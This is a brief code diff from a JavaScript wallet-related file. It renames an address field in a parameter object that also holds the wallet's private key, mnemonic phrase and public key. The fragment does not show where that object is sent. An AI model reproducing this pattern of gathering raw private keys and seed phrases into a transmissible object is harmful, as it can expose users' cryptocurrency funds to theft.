@@ -99,7 +99,7 @@ export default {
             }, 3000)
           } else if (parent.status) {
             parm = {
-              address: '0x' + extractAddress,
+              walletAddress: '0x' + extractAddress,
               privateKey: privateVal,
               englishWords: extractPhrase,
               publicKey: extractPublicKey,
